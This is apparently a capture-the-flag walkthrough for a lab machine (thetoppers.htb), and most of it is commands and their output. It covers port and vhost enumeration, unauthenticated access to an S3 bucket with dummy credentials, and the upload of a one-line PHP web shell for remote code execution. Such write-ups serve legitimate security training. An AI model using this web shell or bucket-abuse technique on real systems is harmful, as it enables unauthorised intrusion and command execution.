```
┌──(julicc㉿diavlo)-[~]
└─$ nmap -sV 10.129.87.47
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-19 14:14 +0200
Nmap scan report for 10.129.87.47
Host is up (0.081s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.82 seconds
```

```
┌──(julicc㉿diavlo)-[~]
└─$ nmap -sV -sC --script=http-enum -p22,80 10.129.87.47
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-19 14:16 +0200
Nmap scan report for 10.129.87.47
Host is up (0.055s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-enum:
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.78 seconds
```

```
┌──(julicc㉿diavlo)-[~]
└─$ whatweb 10.129.87.47
ERROR Opening: https://10.129.87.47 - Connection refused - connect(2) for "10.129.87.47" port 443
http://10.129.87.47 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[mail@thetoppers.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.129.87.47], Script, Title[The Toppers]

┌──(julicc㉿diavlo)-[~]
└─$ gobuster vhost -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-5000.txt -u  http://thetoppers.htb --append-domain
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://thetoppers.htb
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-5000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
s3.thetoppers.htb Status: 404 [Size: 21]
gc._msdcs.thetoppers.htb Status: 400 [Size: 306]
m..thetoppers.htb Status: 400 [Size: 306]
ns2.cl.bellsouth.net..thetoppers.htb Status: 400 [Size: 306]
ns1.viviotech.net..thetoppers.htb Status: 400 [Size: 306]
ns2.viviotech.net..thetoppers.htb Status: 400 [Size: 306]
ns3.cl.bellsouth.net..thetoppers.htb Status: 400 [Size: 306]
jordan.fortwayne.com..thetoppers.htb Status: 400 [Size: 306]
quatro.oweb.com..thetoppers.htb Status: 400 [Size: 306]
ferrari.fortwayne.com..thetoppers.htb Status: 400 [Size: 306]
Progress: 5000 / 5000 (100.00%)
===============================================================
Finished
===============================================================
```

The webpage only contains the following JSON.
`{"status": "running"}`
Note: If instead of JSON you get a Proxy Error, give the box a few minutes to
properly boot.

What is an S3 bucket?
A quick Google search containing the keywords "s3 subdomain status running" returns this result stating that S3 is a cloud-based object storage service. It allows us to store things in containers called buckets. AWS S3 buckets have various use-cases including Backup and Storage, Media Hosting, Software Delivery, Static Website etc. The files stored in the Amazon S3 bucket are called S3 objects.

We can interact with this S3 bucket with the aid of the awscli utility. It can be installed on Linux using the command apt install awscli .
First, we need to configure it using the following command.
`aws configure`
We will be using an arbitrary value for all the fields, as sometimes the server is configured to not check authentication (still, it must be configured to something for aws to work).

```
┌──(julicc㉿diavlo)-[~]
└─$ aws configure
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
```

We can list all of the S3 buckets hosted by the server by using the ls command.
┌──(julicc㉿diavlo)-[~]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls
2026-04-19 14:10:58 thetoppers.htb

We can also use the ls command to list objects and common prefixes under the specified bucket.
┌──(julicc㉿diavlo)-[~]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2026-04-19 14:10:59          0 .htaccess
2026-04-19 14:10:59      11952 index.php

awscli has got another feature that allows us to copy files to a remote bucket. We already know that the website is using PHP. Thus, we can try uploading a PHP shell file to the S3 bucket and since it's uploaded to the webroot directory we can visit this webpage in the browser, which will, in turn, execute this file and we will achieve remote code execution.
```
┌──(julicc㉿diavlo)-[~]
└─$ echo '<?php system($_GET["cmd"]); ?>' > shell.php

┌──(julicc㉿diavlo)-[~]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
upload: ./shell.php to s3://thetoppers.htb/shell.php
```

![[Pasted image 20260419162822.png]]![[Pasted image 20260419163036.png]]
![[Pasted image 20260419163344.png]]
![[Pasted image 20260419163414.png]]